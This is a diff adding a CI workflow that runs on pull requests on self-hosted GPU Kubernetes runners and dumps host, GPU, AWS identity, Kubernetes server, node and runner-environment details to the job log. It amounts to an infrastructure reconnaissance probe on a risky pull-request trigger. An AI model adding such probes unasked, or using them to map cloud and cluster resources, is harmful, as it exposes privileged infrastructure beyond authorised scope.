@@ -1,0 +1,24 @@
+name: campaign-gpu-canary
+on:
+  pull_request:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: [self-hosted, p5-eks]
+    timeout-minutes: 12
+    steps:
+      - name: host-and-gpu-probe
+        run: |
+          echo "=== PROBE-START $(date -u +%FT%TZ) ==="
+          echo "=== HOSTNAME ==="; hostname; hostname -f 2>/dev/null || true
+          echo "=== WHOAMI ==="; id; pwd; uname -a
+          echo "=== OS ==="; (cat /etc/os-release 2>/dev/null | head -3) || true
+          echo "=== NVIDIA-SMI-L ==="; (nvidia-smi -L 2>&1 || echo "nvidia-smi-not-available")
+          echo "=== NVIDIA-SMI-QUERY ==="; (nvidia-smi --query-gpu=index,name,memory.total,memory.free,driver_version --format=csv 2>&1 || true)
+          echo "=== DEV-NVIDIA ==="; (ls -l /dev/nvidia* 2>&1 | head -12) || true
+          echo "=== AWS-IDENTITY ==="; (aws sts get-caller-identity 2>&1 || echo "aws-cli-unavailable-or-denied")
+          echo "=== AWS-REGION ==="; echo "AWS_REGION=${AWS_REGION:-unset} AWS_DEFAULT_REGION=${AWS_DEFAULT_REGION:-unset}"
+          echo "=== K8S-SERVER ==="; (kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>&1 || echo "kubectl-unavailable"); echo
+          echo "=== K8S-NODES ==="; (kubectl get nodes -o wide 2>&1 | head -10) || true
+          echo "=== RUNNER-CTX ==="; env | grep -E '^(RUNNER_NAME|RUNNER_OS|RUNNER_ARCH|GITHUB_WORKFLOW|GITHUB_JOB|KUBERNETES_SERVICE_HOST)='
+          echo "=== PROBE-END ==="
